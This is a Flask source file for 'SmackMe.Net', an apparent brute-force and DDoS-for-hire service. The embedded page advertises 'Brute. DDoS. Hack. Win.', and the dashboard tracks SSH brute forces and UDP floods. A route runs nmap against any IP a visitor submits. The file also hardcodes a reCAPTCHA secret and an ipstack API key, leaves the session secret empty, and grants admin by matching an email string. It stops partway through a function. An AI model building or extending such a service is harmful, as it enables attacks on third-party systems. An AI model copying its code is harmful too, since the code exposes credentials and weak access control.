from flask import Flask, abort, render_template, request, redirect, url_for, session, flash, jsonify  # type: ignore 
from flask_socketio import SocketIO, emit, join_room, leave_room  # type: ignore 
from django_ratelimit.decorators import ratelimit
from flask_limiter import Limiter
from functools import wraps
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import CSRFProtect  # type: ignore
from flask_wtf import FlaskForm  # type: ignore
from wtforms import StringField, PasswordField, TextAreaField, FileField, SubmitField  # type: ignore 
from wtforms.validators import DataRequired, Email, Length  # type: ignore 
from werkzeug.security import generate_password_hash, check_password_hash  # type: ignore 
from werkzeug.utils import secure_filename  # type: ignore
from scapy.all import send, IP, UDP  # type: ignore
import time 
import sqlite3 
from email.mime.text import MIMEText 
from email.mime.multipart import MIMEMultipart 
from dotenv import load_dotenv
import smtplib
from flask_sqlalchemy import SQLAlchemy  # type: ignore
import os 
import string 
import random 
import smtplib 
from scapy.all import *  # type: ignore
import requests  # type: ignore
import paramiko  # type: ignore
import secrets
import subprocess

app = Flask(__name__)
app.secret_key = ''
app.config['SECRET_KEY'] = ''
basedir = os.path.abspath(os.path.dirname(__file__))
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{os.path.join(basedir, "db.db")}'
app.config['DATABASE'] = 'db.db'
app.config['UPLOAD_FOLDER'] = 'static/uploads'
app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg', 'jpeg', 'gif'}

socketio = SocketIO(app)
db = SQLAlchemy(app)
load_dotenv()

RECAPTCHA_SECRET_KEY = '6Lf_xiYqAAAAAMLNWDiZ06QCy-dQYr4qNVqVcBN_'
DATABASE = 'db.db'

class LoginForm(FlaskForm):
    email = StringField('Email', validators=[DataRequired(), Email()])
    password = PasswordField('Password', validators=[DataRequired()])

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

def update_user_bio_and_picture(email, bio, profile_picture):
    try:
        # Connect to the database with a timeout parameter
        conn = sqlite3.connect('C:\\Users\\Administrator\\Desktop\\SQL\\database.db', timeout=10)
        cursor = conn.cursor()
        
        # Update the user's bio and profile picture
        cursor.execute("UPDATE users SET bio = ?, profile_picture = ? WHERE email = ?", (bio, profile_picture, email))
        
        # Commit the transaction
        conn.commit()
    except sqlite3.OperationalError as e:
        # Handle the database locked error or log it
        print(f"Database error: {e}")
    finally:
        # Ensure the connection is closed
        conn.close()

def fetch_user_data(email):
    try:
        with sqlite3.connect('C:\\Users\\Administrator\\Desktop\\SQL\\db.db', timeout=10) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE email = ?", (email,))
            user = cursor.fetchone()
            return user
    except sqlite3.OperationalError as e:
        print(f"Database error: {e}")
        return None

def get_all_users():
    conn = sqlite3.connect(app.config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()
    conn.close()
    return users

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Check if the user is logged in and is the admin
        if 'email' in session and session['email'].lower() == 'admin@gmail.com':
            return f(*args, **kwargs)
        else:
            abort(403)  # Forbidden access
    return decorated_function

class User(db.Model):
    __tablename__ = 'users'  # Ensure this matches your actual table name
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    phone = db.Column(db.String(20))

def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def get_user_by_email(email):
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE email = ?", (email,))
    user = cursor.fetchone()
    conn.close()
    if user:
        return {'id': user[1], 'email': user[2], 'profile_picture': user[4]}  # Adjust indices as per your database schema
    return None

@app.route('/')
def index():
    ip_address = request.remote_addr
    # Log IP address along with other details
    app.logger.info(f"Request from IP: {ip_address}")
    return """
    <!DOCTYPE html>
<!--[if IE 7 ]><html class="ie7 oldie"><![endif]-->
<!--[if IE 8 ]><html class="ie8 oldie"><![endif]-->
<!--[if IE 9 ]><html class="ie9"><![endif]-->
<!--[if (gt IE 9)|!(IE)]><!-->
<html>
<!--<![endif]-->
<head>
    <title>SmackMe.Net's Informational!</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <meta charset="utf-8"/>
    <!-- External CSS Files -->
    <link rel="stylesheet" href="static/style.css" type="text/css" media="screen" />
    <link rel="stylesheet" href="static/nivo-slider.css" type="text/css" />
    <link rel="stylesheet" href="static/experiment.css" type="text/css" />
    <link rel="stylesheet" href="static/index.css" type="text/css" />
    <link rel="stylesheet" href="static/jquery.fancybox-1.3.4.css" type="text/css" />
    <!-- IE-specific Scripts -->
    <!--[if lt IE 9]><script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
    <!-- jQuery and Other Scripts -->
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.6/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="js/jquery-1.6.1.min.js"><\/script>')</script>
    <script src="static/js/jquery.smoothscroll.js"></script>
    <script src="static/js/jquery.nivo.slider.pack.js"></script>
    <script src="static/js/jquery.easing-1.3.pack.js"></script>
    <script src="static/js/jquery.fancybox-1.3.4.pack.js"></script>
    <script src="static/js/init.js"></script>
</head>
<body>
    <!-- header-wrap -->
    <div id="header-wrap">
        <header>
            <hgroup>
                <h1><a href="index.html">SmackMe.Net's Informational!</a></h1>
                <h3>A User Friendly Brute, And Pentesting Service.</h3>
            </hgroup>
            <nav>
                <ul>
                    <li><a href="#main">Home</a></li>
                    <li><a href="#services">Services</a></li>
                    <li><a href="#portfolio">Our Works</a></li>
                    <li><a href="#about-us">About Us</a></li>
                    <li><a href="#styles">Styles</a></li>
                    <li><a href="#contact">Contact Us</a></li>
                    <li><a href="/login">Login</a></li>
                    <li><a href="/profile">Profile</a></li>
                    <li><a href="/dashboard">Dashboard</a></li>
                </ul>
            </nav>
        </header>
    </div>
<!-- content-wrap -->
<div class="content-wrap">
    <!-- main -->
    <section id="main">
        <div class="intro-box">
            <h1>SmackMe Additional Info (WELCOME!!)</h1>
            <p class="intro">Hello there. We are SmackMe. We are a small Influenctially based DDoS/Pentesting Service Used For Your Needs In Configuring Your Own Cyber Security Scenarios To Prevent These Attacks. We create Tools Powerful And Effective, Friendly User Interfaces, And Other Digital Stuff As We As A Company Grow And Add Additional Tools. We're Here To Make You Feel In Control.</p>
            <p class="intro">Learn more <a href="#about-us">about us</a> or <a href="#contact">get in touch</a> if you have and recommendations or concernes or issues.</p>
        </div>
        <div class="slider-wrapper">
            <div id="slider" class="nivoSlider">
                <img src="static/images/slides/slide3.png" width="420" height="198" alt="" />
                <img src="static/images/slides/slide2.png" width="420" height="198" alt="" />
                <img src="static/images/slides/slide1.png" width="420" height="198" alt="" />
             </div>
            </div>
            <div id="htmlcaption" class="nivo-html-caption">
                <strong>The development ^^ </strong> of our platform <em>SmackMe.Net</em> Terms Of Service <a href="/terms_of_service">Click Me</a>.
            </div>
        </div>
        <div class="row no-bottom-margin">
            <section class="col">
                <h2>Creative Ideas</h2>
                <p>The Provocation of making this website was completely for the circumstance of providing a service that allows users such as yourself to be able to participate in pestesting services since a majority dont know how to do it on their own. A lot of pentesting and cyber security situations require additional knowledge and a understanding of security mechanisms. We here at SmackMe are directing towards a Easy service that allows you the user to do what they want when they please.</p>
            </section>
            <section class="col mid">
                <h2>Innovation</h2>
                <p></p>
            </section>
            <section class="col">
                <h2>Design and Development</h2>
                <p>The design of this website all was purely made for a appealing look and a open honesty when users want a service they can trust.</p>
            </section>
        </div>
    </section>
    <!-- services -->
    <section id="services" >
        <h1>Our services.</h1>
        <div class="row no-bottom-margin">
            <section class="col">
                <h2>Web Design</h2>
                <p><img class="align-left" alt="" src="static/images/services/webdesign.png" />The design of this page took nearly 3-4 months considering all of the different aspect included to make it more appealing to the public or for a better understanding, for you the user. The design of this page was made how it is for easy navigation across our platform. We have additional payment plans for features that will be included after payment. We take any type of credit card also including cash cards and paypal.</p>
            </section>
            <section class="col mid">
                <h2>Web Development</h2>
                <p><img class="align-left" alt="" src="static/images/services/webdevelopment.png" />Since our website is a privately owned site and not a business (example: accessible in person) we will have our ears open for support and questions 24/7 of all hours of the way and apon emailing, messaging, or calling us we will be in contact with you within 1-3 hours of your original concern. We apologize for the inconvinience</p>
            </section>
            <section class="col">
                <h2>SEO Services</h2>
                <p><img class="align-left" alt="" src="static/images/services/seo-services.png" />The admins on our platform can help you to change anything about your account. This includes account information such as your email, phone number, username. But YOU will have the function to delete or register a new account if needed until we implement the proper functions to edit and change content on your own.</p>
            </section>
        </div>
        <div class="row">
            <section class="col">
                <h2>Production Design</h2>
                <p><img class="align-left" alt="" src="static/images/services/print-design.png" />The production of this website was soley ran by me and my buddies who decided we wanted to make a service and a platform for users that can help them in everyday things in cyber security related issues. Any use of our templates or any use of our code in any online development will result in legal action implied on the individual who decides to forbid these rules. This is stationed under the Copyright Act of 1976 (Title 17 of the United States Code), The Design Patent Act: In the U.S., this falls under the Patent Act, particularly Title 35 of the United States Code, which includes provisions for design patents (Sections 171-173) and the Lanham Act: In the U.S., trade dress protection is covered under the Lanham Act (15 U.S.C.  1051 et seq.), which includes provisions for trademarks and trade dress.</p>
            </section>
            <section class="col mid">
                <h2>Logo Design &amp; Branding</h2>
                <p><img class="align-left" alt="" src="static/images/services/logo-design-and-branding.png" />No Logo or branding yet. Soon</p>
            </section>
            <section class="col">
                <h2>In Other News</h2>
                <p><img class="align-left" alt="" src="static/images/services/newsletter.png" />We will be constantly checking in on our website and its users like yourself to provide updated information, new tools, and upgraded functions to better increase the effects of what our platform is designed to do. We hope you enjoy our platform and use for the right purposes. Thank you.</p>
            </section>
        </div>
        <a class="back-to-top" href="#main">Back to Top</a>
    </section>
    <!-- portfolio -->
    <section id="portfolio">
        <h1>Featured works.</h1>
        <ul class="folio-list clearfix">
            <li class="folio-thumb">
                <div class="thumb">
                    <a class="lightbox" href="static/images/thumbs/big/milk.jpg">
                        <img src="static/images/thumbs/milk.jpg" alt="" />
                    </a>
                </div>
                <h3>Got Milk?</h3>
            </li>
            <li class="folio-thumb">
                <div class="thumb">
                    <a class="lightbox" href="SQL/static/images/thumbs/big/lin.jpg">
                        <img src="SQL/static/images/thumbs/lin.jpg" alt="" />
                    </a>
                </div>
                <h3>Production images</h3>
            </li>
            <li class="folio-thumb">
                <div class="thumb">
                    <a class="lightbox" href="static/images/thumbs/big/kindle.jpg">
                        <img src="static/images/thumbs/kindle.jpg" alt="" />
                    </a>
                </div>
                <h3>Experimental features</h3>
            </li>
            <li class="folio-thumb">
                <div class="thumb">
                    <a class="lightbox" href="static/images/thumbs/big/leaves.jpg">
                        <img src="static/images/thumbs/leaves.jpg" alt="" />
                    </a>
                </div>
                <h3>Sem et fermentum ligula</h3>
            </li>
            <li class="folio-thumb">
                <div class="thumb">
                    <a class="lightbox" href="static/images/thumbs/big/bubble.jpg">
                        <img src="static/images/thumbs/bubble.jpg" alt="" />
                    </a>
                </div>
                <h3>Odio tortor, sed platea</h3>
            </li>
            <li class="folio-thumb">
                <div class="thumb">
                    <a class="lightbox" href="static/images/thumbs/big/book.jpg">
                        <img src="static/images/thumbs/book.jpg" alt="" />
                    </a>
                </div>
                <h3>Nunc nec quam vitae nisl</h3>
            </li>
            <li class="folio-thumb">
                <div class="thumb">
                    <a class="lightbox" href="static/images/thumbs/big/chairs.jpg">
                        <img src="static/images/thumbs/chairs.jpg" alt="" />
                    </a>
                </div>
                <h3>Vehicula euismod Lorem</h3>
            </li>
            <li class="folio-thumb">
                <div class="thumb">
                    <a class="lightbox" href="static/images/thumbs/big/phone.jpg">
                        <img src="static/images/thumbs/phone.jpg" alt="" />
                    </a>
                </div>
                <h3>Habitasse platea risus</h3>
            </li>
        </ul>
        <a class="back-to-top" href="#main">Back to Top</a>
    </section>
    <!-- about-us -->
    <section id="about-us">
        <h1>About us.</h1>
        <div class="primary">
            <h2>We are a small design studio based in somewhere.</h2>
            <p><img class="align-left" alt="" src="static/images/office.png" />Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed commodo ligula blandit risus lobortis egestas. Vivamus convallis, quam vitae luctus auctor, magna justo interdum urna, non rutrum ante turpis in orci. Integer fringilla magna ut quam vulputate erat. In hac habitasse platea risus dictumst.</p>
            <p>Nascetur augue hac platea enim, egestas pulvinar vut. Pulvinar cum, ac eu, tristie acus duis in dictumst non integer! Elit, sed scelerisque odio tortor, sed platea dis? Quis cursus parturient ac amet odio in? Nunc Amet urna scelerisque eu lectus placerat. Pellentesque magna mi, iaculis pharetra eu, fermentum ullamcorper nisi. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed commodo ligula blandit risus lobortis egestas. Vivamus convallis, quam vitae luctus auctor, magna justo interdum urna, non rutrum ante turpis in orci.</p>
            <p>Integer fringilla magna ut quam vulputate erat. In hac habitasse platea risus dictumst. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed commodo ligula blandit risus lobortis egestas. Vivamus convallis, quam vitae luctus auctor, magna justo interdum urna, non rutrum ante turpis in orci.</p>
        </div>
        <div class="secondary">
            <h2>Our Skills.</h2>
            <p>Nascetur augue hac platea enim, egestas pulvinar vut. Pulvinar cum, ac eu, tristie acus duis in dictumst non integer! Elit, sed scelerisque odio tortor, sed platea dis? Quis cursus parturient ac amet odio in? Nunc Amet urna scelerisque eu lectus placerat. Pellentesque magna mi, iaculis pharetra eu, fermentum ullamcorper nisi.</p>
            <ul>
                <li>Web Design</li>
                <li>Print Design</li>
                <li>Logo Design &amp; Branding</li>
                <li>SEO Services</li>
                <li>Newsletter Design</li>
            </ul>
        </div>
        <a class="back-to-top" href="#main">Back to Top</a>
    </section>
    <!-- styles -->
    <section id="styles">
        <h1>Typography and styles.</h1>
        <h2>1. Headings</h2>
        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed commodo ligula blandit risus lobortis egestas. Vivamus convallis, quam vitae luctus auctor, magna justo interdum urna, non rutrum ante turpis in orci. Integer fringilla magna ut quam vulputate erat.</p>
        <h1>Heading 1</h1>
        <h2>Heading 2</h2>
        <h3>Heading 3</h3>
        <h4>Heading 4</h4>
        <h5>Heading 5</h5>
        <h6>Heading 6</h6>
        <h2>2. Text Styles</h2>
        <p>Lorem ipsum dolor sit amet, <a href="#">this is a link</a> consectetur adipiscing elit. <em>emphasized text</em> Sed commodo ligula <strong>bolded text</strong> blandit risus lobortis egestas. <code>this is some code</code> Vivamus convallis, quam vitae luctus auctor, magna justo interdum urna, non rutrum ante turpis in orci. Integer fringilla magna ut quam vulputate erat.</p>
        <blockquote>
            <p>Vivamus convallis, quam vitae luctus auctor, magna justo interdum urna, non rutrum ante turpis in orci. Integer fringilla magna ut quam vulputate erat.</p>
        </blockquote>
        <h2>3. Lists</h2>
        <p>Steps Advised.</p>
        <ul>
            <li>Brute.</li>
            <li>DDoS.</li>
            <li>Hack.</li>
            <li>Win.</li>
        </ul>
        <p>Here is an example of ordered list</p>
        <ol>
            <li>This is a list item</li>
            <li>Another list item</li>
            <li>And another item</li>
            <li>Another list item</li>
        </ol>
        <h2>4. Table Styles</h2>
        <table>
            <thead>
            <tr>
                <th>Table Header 1</th>
                <th>Table Header 2</th>
                <th>Table Header 3</th>
            </tr>
            </thead>
            <tbody>
            <tr>
                <td>Division 1</td>
                <td>Division 2</td>
                <td>Division 3</td>
            </tr>
            <tr class="even">
                <td>Division 1</td>
                <td>Division 2</td>
                <td>Division 3</td>
            </tr>
            <tr>
                <td>Division 1</td>
                <td>Division 2</td>
                <td>Division 3</td>
            </tr>
            <tr class="even">
                <td>Division 1</td>
                <td>Division 2</td>
                <td>Division 3</td>
            </tr>
            </tbody>
        </table>
        <a class="back-to-top" href="#main">Back to Top</a>
    </section>
    <!-- contact -->
    <section id="contact">
        <h1>Get in touch.</h1>
        <div class="primary">
            <h2>Drop us a line</h2>
            <form id="contactForm" action="">
                <fieldset>
                    <div>
                        <label>Your Name <span class="required">*</span></label>
                        <input name="name" id="name" type="text" />
                    </div>
                    <div>
                        <label>Your Email <span class="required">*</span></label>
                        <input name="email" id="email" type="email" />
                    </div>
                    <div>
                        <label>Your Message <span class="required">*</span></label>
                        <textarea name="comments" id="comments" rows="20" cols="20"></textarea>
                    </div>
                    <div>
                        <button type="submit" class="submit">Send</button>
                        <span id="image-loader">
                            <img src="static/images/loader.gif" alt="" />
                        </span>
                    </div>
                </fieldset>
            </form>
        </div>
        <div class="secondary">
            <h2>Where we are.</h2>
            <p>We are Located in Miami, Florida Area Code 786 In Biscayne Park.</p>
            <div id="map"></div>
        </div>
    </section>
    <!-- footer -->
    <footer>
        <div class="footer-content">
            <div class="primary">
                <h2>Follow Us.</h2>
                <ul class="social-links">
                    <li><a href="https://www.instagram.com/1_statement_1/?utm_source=ig_web_button_share_sheet"><i class="fab fa-instagram">1_statement_1 - Instagram</i></a></li>
                    <li><a href="https://www.instagram.com/slanginng/?utm_source=ig_web_button_share_sheet"><i class="fab fa-instagram">slanginng - Instagram</i></a></li>
                    <li><a href="https://www.instagram.com/nokonnektion/?utm_source=ig_web_button_share_sheet"><i class="fab fa-instagram">nokonnektion - Instagram</i></a></li>
                    <li><a href="https://www.instagram.com/shemyybae/?utm_source=ig_web_button_share_sheet"><i class="fab fa-instagram">ShemyyBae - Instagram</i></a></li>
                </ul>
            </div>
            <div class="secondary">
                <h2>Contact Info.</h2>
                <ul class="contact-info">
                    <li><i class="fas fa-map-marker-alt"></i> Miami Florida, USA</li>
                    <li><i class="fas fa-phone"></i> (706) 707-8897 </li>
                    <li><i class="fas fa-envelope"></i> glxckgang50002963@gmail.com</li>
                </ul>
            </div>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2024 SmackMe.Net. All rights reserved.</p>
        </div>
        <a class="back-to-top" href="#main">Back to Top</a>
    </footer>
</div>
</body>
</html>
    """
@socketio.on('connect')
def handle_connect():
    emit('update_users', get_all_users(), broadcast=True)

@socketio.on('new_user')
def handle_new_user(data):
    emit('update_users', get_all_users(), broadcast=True)

@socketio.on('message')
def handle_message(data):
    print('Message received:', data)
    # Broadcast message to all connected clients
    emit('message', data, broadcast=True)

@socketio.on('join')
def handle_join(data):
    username = session.get('email', 'Anonymous')
    room = data['room']
    join_room(room)
    emit('message', {'username': 'System', 'message': f'{username} has joined the room.'}, room=room)

@socketio.on('leave')
def handle_leave(data):
    username = session.get('email', 'Anonymous')
    room = data['room']
    leave_room(room)
    emit('message', {'username': 'System', 'message': f'{username} has left the room.'}, room=room)

def get_db():
    """Open a new database connection."""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row  # This allows us to access columns by name
    return conn

def query_db(query, args=(), one=False):
    """Query the database and return the results."""
    conn = get_db()
    cursor = conn.execute(query, args)
    rv = cursor.fetchall()
    conn.close()
    return (rv[0] if rv else None) if one else rv

@app.route('/api/active-connections')
def active_connections():
    result = query_db('SELECT COUNT(*) FROM connections WHERE status="active"')
    return jsonify({'activeConnections': result[0][0]})

@app.route('/api/logins')
def logins():
    result = query_db('SELECT COUNT(*) FROM logins WHERE timestamp > datetime("now", "-1 hour")')
    return jsonify({'logins': result[0][0]})

@app.route('/api/ssh-brute-forces')
def ssh_brute_forces():
    result = query_db('SELECT COUNT(*) FROM ssh_brute_forces WHERE timestamp > datetime("now", "-1 hour")')
    return jsonify({'sshBruteForces': result[0][0]})

@app.route('/api/udp-floods')
def udp_floods():
    result = query_db('SELECT COUNT(*) FROM udp_floods WHERE timestamp > datetime("now", "-1 hour")')
    return jsonify({'udpFloods': result[0][0]})

@app.route('/api/ip-osint-lookups')
def ip_osint_lookups():
    result = query_db('SELECT COUNT(*) FROM ip_osint_lookups WHERE timestamp > datetime("now", "-1 hour")')
    return jsonify({'ipOsintLookups': result[0][0]})

@app.route('/api/update-data')
def update_data():
    return jsonify({
        'activeConnections': query_db('SELECT COUNT(*) FROM connections WHERE status="active"')[0][0],
        'logins': query_db('SELECT COUNT(*) FROM logins WHERE timestamp > datetime("now", "-1 hour")')[0][0],
        'sshBruteForces': query_db('SELECT COUNT(*) FROM ssh_brute_forces WHERE timestamp > datetime("now", "-1 hour")')[0][0],
        'udpFloods': query_db('SELECT COUNT(*) FROM udp_floods WHERE timestamp > datetime("now", "-1 hour")')[0][0],
        'ipOsintLookups': query_db('SELECT COUNT(*) FROM ip_osint_lookups WHERE timestamp > datetime("now", "-1 hour")')[0][0]
    })

@app.errorhandler(403)
def forbidden_error(error):
    return render_template('403.html'), 403

@app.route('/scan', methods=['GET', 'POST'])
def scan():
    if request.method == 'POST':
        target_url = request.form.get('target_url')
        if target_url:
            # This is a placeholder command; replace with actual scanning command
            result = subprocess.run(['echo', 'Scanning', target_url], capture_output=True, text=True)
            return jsonify({"result": result.stdout})
        return jsonify({"error": "No target URL provided"})
    
    # For GET requests, render the scan.html template
    return render_template('scan.html')

# Port Scanning
@app.route('/portscan', methods=['GET', 'POST'])
def portscan():
    if request.method == 'POST':
        target_ip = request.form.get('target_ip')
        port_range = request.form.get('port_range')
        if target_ip and port_range:
            # This is a placeholder command; replace with actual Nmap command
            result = subprocess.run(['nmap', '-p', port_range, target_ip], capture_output=True, text=True)
            return jsonify({"result": result.stdout})
        return jsonify({"error": "IP or port range not provided"})
    
    # For GET requests, render the scan.html template
    return render_template('scan.html')

# Web Application Testing
@app.route('/webtest', methods=['GET', 'POST'])
def webtest():
    if request.method == 'POST':
        test_url = request.form.get('test_url')
        test_type = request.form.get('test_type')
        if test_url and test_type:
            # This is a placeholder command; replace with actual testing command
            result = subprocess.run(['echo', 'Testing', test_url, 'with', test_type], capture_output=True, text=True)
            return jsonify({"result": result.stdout})
        return jsonify({"error": "URL or test type not provided"})
    return render_template('scan.html')

@app.route('/chat')
def chat():
    if 'email' in session:
        # Render chat page with the logged-in user's email
        return render_template('chat.html', username=session['email'])
    else:
        # Redirect to login page if the user is not logged in
        flash('You need to log in to access the chat', 'error')
        return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        
        # Fetch the user from the database
        conn = sqlite3.connect(app.config['DATABASE'])
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE email = ?", (email,))
        user = cursor.fetchone()
        conn.close()
        
        if user:
            if check_password_hash(user[2], password):  # Assuming user[2] is the password column
                session['user_id'] = user[0]  # Store user_id in session
                session['email'] = email  # Store email in session                
                if email.lower() == 'admin@gmail.com':
                    # Redirect to admin dashboard if email is Admin@gmail.com
                    return redirect(url_for('admin_dashboard'))
                
                flash('Logged in successfully.', 'success')
                return redirect(url_for('profile'))
            else:
                flash('Invalid credentials', 'error')
        else:
            flash('No user found with this email', 'error')
    
    return render_template('login.html')

def get_user(user_id):
    # Query the 'users' table for a specific user ID
    user = db.session.query(User).filter_by(id=user_id).first()
    return user

def update_user_settings(user_id, email, phone):
    # Retrieve the user to update
    user = get_user(user_id)
    if user:
        user.email = email
        user.phone = phone
        db.session.commit()

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    # Check if user is logged in
    if 'user_id' not in session:
        flash('You need to log in first.')
        return redirect(url_for('login'))  # Redirect to login if user is not logged in

    user_id = session['user_id']
    user = get_user(user_id)  # Fetch user data from the database

    if request.method == 'POST':
        # Update user settings
        new_email = request.form.get('email')
        new_phone = request.form.get('phone')
        # Add other settings fields as needed

        try:
            update_user_settings(user_id, new_email, new_phone)  # Update user settings in the database
            flash('Settings updated successfully.')
            return redirect(url_for('settings'))
        except Exception as e:
            flash(f'An error occurred: {e}')
    
    # Render settings page with the current user data (GET request)
    return render_template('settings.html', user=user)

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if 'email' not in session:
        flash('You need to login first.', 'error')
        return redirect(url_for('login'))

    if request.method == 'POST':
        bio = request.form['bio']
        file = request.files.get('profile_picture')
        filename = None
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        update_user_bio_and_picture(session['email'], bio, filename)
        flash('Profile updated successfully.', 'success')
        return redirect(url_for('profile'))

    # Fetch the user information
    conn = sqlite3.connect(app.config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE email = ?", (session['email'],))
    user = cursor.fetchone()
    conn.close()
    
    return render_template('profile.html', user=user)

def get_country_details(country_code):
    rest_countries_url = f"https://restcountries.com/v3.1/alpha/{country_code}"
    response = requests.get(rest_countries_url)
    if response.status_code == 200:
        country_data = response.json()
        return country_data
    else:
        return None

def print_additional_country_details(country_data):
    if country_data:
        country_info = country_data[0]
        country_iso3 = country_info.get('cca3', '')
        country_capital = country_info.get('capital', [''])[0]
        country_tld = country_info.get('tld', [''])
        in_eu = "EU" in country_info.get('region', [])
        utc_offset = country_info.get('timezones', [''])[0]
        country_calling_code = country_info.get('idd', {}).get('root', '') + ''.join(country_info.get('idd', {}).get('suffixes', []))
        currency_info = list(country_info.get('currencies', {}).values())[0] if country_info.get('currencies') else {}
        currency = list(country_info.get('currencies', {}).keys())[0] if country_info.get('currencies') else ''
        currency_name = currency_info.get('name', '')
        country_area = country_info.get('area', '')
        country_population = country_info.get('population', '')
        print("[Country ISO3 Code]: {}".format(country_iso3))
        print("[Country Capital]: {}".format(country_capital))
        print("[Country TLD]: {}".format(", ".join(country_tld)))
        print("[In EU]: {}".format(in_eu))
        print("[UTC Offset]: {}".format(utc_offset))
        print("[Country Calling Code]: {}".format(country_calling_code))
        print("[Currency]: {}".format(currency))
        print("[Currency Name]: {}".format(currency_name))
        print("[Country Area]: {}".format(country_area))
        print("[Country Population]: {}".format(country_population))

def get_ip_info(ip_address):
    api_key = "8b40e1b1dff83b64f6aaefa56f1438b2"
    try:
        response = requests.get(f"http://api.ipstack.com/{ip_address}?access_key={api_key}")
        response.raise_for_status()  # Raise an exception for 4xx/5xx errors
        print("Raw API response:", response.json())
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        raise e
    except ValueError as e:
        print(f"JSON parsing error: {e}")
        raise e

@app.route('/ip_osint_lookup', methods=['GET'])
def ip_osint_lookup():
    ip_address = request.args.get('ip')
    if not ip_address:
        return redirect(url_for('ip_lookup_form'))

    try:
        data = get_ip_info(ip_address)
        
        return jsonify({
            "ip_version": data.get("type"),
            "coordinates": f"{data.get('latitude')}, {data.get('longitude')}",
            "country_code": data.get("country_code"),
            "country_iso3_code": data.get("location", {}).get("country_iso3"),
            "country_capital": data.get("location", {}).get("capital"),
            "country_tld": data.get("location", {}).get("country_tld"),
            "in_eu": data.get("location", {}).get("is_in_eu"),
            "utc_offset": data.get("location", {}).get("time_zone", {}).get("utc_offset"),
            "country_calling_code": data.get("location", {}).get("calling_code"),
            "currency": data.get("location", {}).get("currency", {}).get("code"),
            "currency_name": data.get("location", {}).get("currency", {}).get("name"),
            "country_area": data.get("location", {}).get("country_area"),
            "country_population": data.get("location", {}).get("country_population"),
            "asn": data.get("asn"),
            "postal_code": data.get("location", {}).get("postal_code"),
            "timezone": data.get("location", {}).get("time_zone", {}).get("id"),
            "local_time": data.get("location", {}).get("time_zone", {}).get("current_time"),
            "city": data.get("city"),
            "region": data.get("region_name"),
            "ipv6_address": data.get("ipv6_address"),
            "local_ip_address": data.get("local_ip_address"),
            "public_ip_address": data.get("public_ip_address"),
            "os": data.get("os"),
            "link": data.get("link"),
            "mtu": data.get("mtu"),
            "distance": data.get("distance"),
            "ja3_hash": data.get("ja3_hash"),
            "akamai_hash": data.get("akamai_hash"),
        })
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Request error: {str(e)}"}), 500
    except ValueError as e:
        return jsonify({"error": f"JSON parsing error: {str(e)}"}), 500
    except Exception as e:
        return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500

@app.route('/ip_lookup_form', methods=['GET'])
def ip_lookup_form():
    return render_template('ip_osint.html')

@app.route('/update_bio', methods=['POST'])
def update_bio():
    if 'user_id' in session:
        user_id = session['user_id']
        bio = request.form['bio']
        
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET bio = ? WHERE id = ?", (bio, user_id))
        conn.commit()
        conn.close()
        
        flash('Bio updated successfully', 'success')
        return redirect(url_for('profile'))
    else:
        return 'You are not logged in.'

@app.route('/logout')
def logout():
    return render_template('logout.html')


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        password = request.form['password']
        phone = request.form['phone']
        confirm_password = request.form['confirm_password']

        if password != confirm_password:
            flash('Passwords do not match.', 'error')
            return render_template('register.html')

        hashed_password = generate_password_hash(password)
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()

        try:
            cursor.execute("INSERT INTO users (name, email, password, phone) VALUES (?, ?, ?, ?)",
                           (name, email, hashed_password, phone))
            conn.commit()
            flash('Registration successful. Please log in.', 'success')
            return redirect(url_for('login'))  # Redirect to login page after successful registration
        except sqlite3.IntegrityError:
            flash('Email already registered. Please use a different email.', 'error')
        finally:
            conn.close()
    
    # If GET request (initial page load), or if POST request failed, render the registration form
    return render_template('register.html')

@app.route('/dashboard')
def dashboard():
    print("Session contents:", session)
    if 'email' in session:
        return render_template('dashboard.html')
    else:
        flash('You need to log in to access the dashboard', 'error')
        return redirect(url_for('login'))

def send_reset_code(email, code):
    sender_email = os.getenv('EMAIL_USERNAME')
    receiver_email = email
    password = os.getenv('EMAIL_PASSWORD')
    if not sender_email or not password:
        raise ValueError("Email credentials are not set in environment variables.")
    message = MIMEMultipart("alternative")
    message["Subject"] = "Password Reset Code"
    message["From"] = sender_email
    message["To"] = receiver_email
